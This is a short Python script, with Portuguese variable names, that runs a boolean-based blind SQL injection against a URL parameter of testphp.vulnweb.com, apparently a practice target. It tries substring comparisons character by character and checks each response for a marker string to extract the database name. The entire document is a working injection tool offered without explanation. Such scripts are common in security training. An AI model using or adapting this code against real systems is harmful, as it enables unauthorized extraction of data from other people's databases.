import requests
from concurrent.futures.process import ProcessPoolExecutor 
from time import sleep

db =[]

def inject_simple(url,query):
    reference = 'Blad3'
    for i in range(1, 10):
      for j in range(ord('a'), ord('u') + 1):
        montagem =f"{url} and substring( ( {query} ), {str(i)} ,1 )= {hex(ord(chr(j)))} -- -"
        print(montagem)        
        r = requests.get(montagem)
       
        html = r.text
        if reference in html:
            db.append(chr(j))
    return db   


if __name__ == '__main__':
    with ProcessPoolExecutor() as iniciar:
        resposta = iniciar.submit(inject_simple,'http://testphp.vulnweb.com/artists.php?artist=2','database()')



print(f"Banco de dados :===> {''.join(resposta.result())}")
